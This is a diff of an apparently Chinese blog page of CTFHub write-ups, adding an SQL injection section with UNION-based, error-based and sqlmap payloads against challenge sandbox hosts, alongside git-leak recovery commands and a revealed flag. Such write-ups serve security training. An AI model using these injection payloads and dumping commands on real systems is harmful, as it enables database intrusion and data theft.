@@ -519,21 +519,21 @@ HTTP是Hyper Text Transfer">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-07-17
+                    2020-07-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.4k
+                    4.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    13 分
+                    16 分
                 </div>
                 
 				
@@ -743,12 +743,10 @@ list2 <span class="token operator">=</span> <span class="token punctuation">[</s
 ④.git/refs/stash 工作进度的临时保存
 ⑤.git/info/packs packs文件提取恢复<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h4><p>1.使用dirsearch工具扫描网站目录，发现git泄露.git/logs/HEAD，在git中是存储历史记录的</p>
-<p>​```bash<br>python3 dirsearch.py -u “<a href="http://challenge-89c367ed8802f5e5.sandbox.ctfhub.com:10080&quot;" target="_blank" rel="noopener">http://challenge-89c367ed8802f5e5.sandbox.ctfhub.com:10080&quot;</a> -e *</p>
-<pre><code>
-2.使用GitHack工具克隆目标源代码到本地
-
-```bash
-python GitHack.py http://challenge-89c367ed8802f5e5.sandbox.ctfhub.com:10080/.git/</code></pre><p>3.执行<code>git log</code>查看commit历史记录  可以看到当前版本是remove flag，我们要的flag在add flag中</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python3 dirsearch.py -u <span class="token string">"http://challenge-89c367ed8802f5e5.sandbox.ctfhub.com:10080"</span> -e *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>2.使用GitHack工具克隆目标源代码到本地</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python GitHack.py http://challenge-89c367ed8802f5e5.sandbox.ctfhub.com:10080/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>3.执行<code>git log</code>查看commit历史记录  可以看到当前版本是remove flag，我们要的flag在add flag中</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200716180358.png" alt></p>
 <p>4.方法1：使用<code>git diff</code>直接与 <code>add flag (e2f0)</code> 这次提交进行差异比对</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200716180418.png" alt></p>
@@ -801,7 +799,95 @@ curl http://challenge-a6460a92a6b0ee37.sandbox.ctfhub.com:10080/.hg/store/data/f
 </blockquote>
 <p>打开链接是一个后台登录页面，直接Burp抓包，猜测用户名为admin,使用Intruder模块进行密码爆破，得到密码为password，登录即可得到flag</p>
 <h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><p>打开页面后，发现是亿邮邮件网关，经百度查询<a href="https://www.uedbox.com/post/23317/" target="_blank" rel="noopener">亿邮邮件网关系统默认口令</a>，直接查到账户和密码，登录即可得到flag</p>
-<h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别【为数字型注入】</span>
+<span class="token number">1</span>
+
+<span class="token comment" spellcheck="true">#确定字段数【字段数为2】</span>
+<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token number">1</span>
+<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token number">2</span>
+<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token number">3</span>
+
+<span class="token comment" spellcheck="true">#确定字段顺序</span>
+<span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>
+
+<span class="token comment" spellcheck="true">#爆数据库名【sqli】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#爆表名【news,flag】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli'</span>
+
+<span class="token comment" spellcheck="true">#爆列名【flag】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'flag'</span>
+
+<span class="token comment" spellcheck="true">#爆值</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>flag <span class="token keyword">from</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200718144309.png" alt></p>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别【为字符型注入】</span>
+<span class="token number">1</span>
+
+<span class="token comment" spellcheck="true">#确定字段数【字段数为2】</span>
+<span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token number">1</span> <span class="token comment" spellcheck="true">#</span>
+<span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token number">2</span> <span class="token comment" spellcheck="true">#</span>
+<span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span>  <span class="token number">3</span> <span class="token comment" spellcheck="true">#</span>
+
+<span class="token comment" spellcheck="true">#确定字段顺序</span>
+<span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token comment" spellcheck="true">#</span>
+
+<span class="token comment" spellcheck="true">#爆数据库名【sqli】</span>
+<span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span>
+或者将<span class="token comment" spellcheck="true">#改为--空格</span>
+
+
+<span class="token comment" spellcheck="true">#爆表名【news,flag】</span>
+<span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema='</span>sqli' <span class="token comment" spellcheck="true">#</span>
+
+
+<span class="token comment" spellcheck="true">#爆列名【flag】</span>
+<span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>flag' <span class="token comment" spellcheck="true">#</span>
+
+<span class="token comment" spellcheck="true">#爆值</span>
+<span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>flag <span class="token keyword">from</span> flag <span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看页面变化，判断sql注入类别【为数字型注入】</span>
+<span class="token number">1</span>
+
+<span class="token comment" spellcheck="true">#确定字段数【字段数为2】</span>
+
+<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span>
+<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span>
+<span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> 报错
+
+<span class="token comment" spellcheck="true">#获取数据库名【Duplicate entry 'sqli-1' for key 'group_key'】注意：有可能要多查几次才能成功</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat_ws<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span>
+
+<span class="token comment" spellcheck="true">#获取表名【 Duplicate entry 'flag-1' for key 'group_key'】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat_ws<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli'</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span>
+<span class="token comment" spellcheck="true">#因为Subquery returns more than 1 row，所以用limit来控制输出,连接函数也不管用</span>
+
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat_ws<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'sqli'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span>
+
+<span class="token comment" spellcheck="true">#获取列名【Duplicate entry 'flag-0' for key 'group_key'】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat_ws<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'flag'</span><span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span>
+
+<span class="token comment" spellcheck="true">#爆值【Duplicate entry 'ctfhub{64d51cbcc3eb2513447c46282c921601c14da36b}-1' for key 'group_key'】</span>
+<span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat_ws<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> flag <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200718202958.png" alt></p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>直接使用sqlmap工具跑</p>
+<pre><code>--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
+--technique:选择注入技术，B、T、E、U、S
+--threads 10 :设置线程为10，运行速度会更快
+--dbms:不仅可以指定数据库类型，还可以指定数据库版本</code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#查询数据库 #【sqli】</span>
+<span class="token comment" spellcheck="true">#technique使用参数B跑不出来，改成T才跑出来</span>
+python sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id<span class="token operator">=</span>1 --technique T --dbs --batch --threads 10 --dbms<span class="token operator">=</span>mysql
+
+<span class="token comment" spellcheck="true">#获取数据库中的表 #【flag】</span>
+python sqlmap.py  -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id<span class="token operator">=</span>1 --technique T -D sqli  --tables --batch --threads 10 --dbms<span class="token operator">=</span>mysql
+
+<span class="token comment" spellcheck="true">#获取表中的字段名 #【flag】</span>
+python sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id<span class="token operator">=</span>1 --technique T -D sqli -T flag --columns --batch --threads 10 --dbms<span class="token operator">=</span>mysql
+
+<span class="token comment" spellcheck="true">#获取字段信息 </span>
+python sqlmap.py -u http://challenge-0107480d29208db9.sandbox.ctfhub.com:10080/?id<span class="token operator">=</span>1 --technique T -D sqli -T flag -C flag --dump --batch --threads 10 --dbms<span class="token operator">=</span>mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭</p>
 <table>
   <tbody>
      <tr>
@@ -1327,10 +1413,8 @@ curl http://challenge-a6460a92a6b0ee37.sandbox.ctfhub.com:10080/.hg/store/data/f
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SQLi-Labs是一个专业的SQL注入练习平台，以前也偶尔练习过一些些关卡，但一直没有系统的练习过，希望这次可以坚持下去吧~~    
-Less-1(GET单引号字符型注入)#查看页面变化，判断sql注入类别
-?id=1 and 1=1
-
+                            SQLi-Labs是一个专业的SQL注入练习平台，以前也偶尔练习过一些些关卡，但一直没有系统的练习全部关卡过，希望这次可以坚持下去吧~~    
+SQLi-LABS闯关游戏下载地址：https://github.com/Audi-1/sql
                         
                     </div>
                     <div class="publish-info">
@@ -1592,7 +1676,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">165.8k</span>&nbsp;字
+                class="white-color">167.5k</span>&nbsp;字
             
             
             
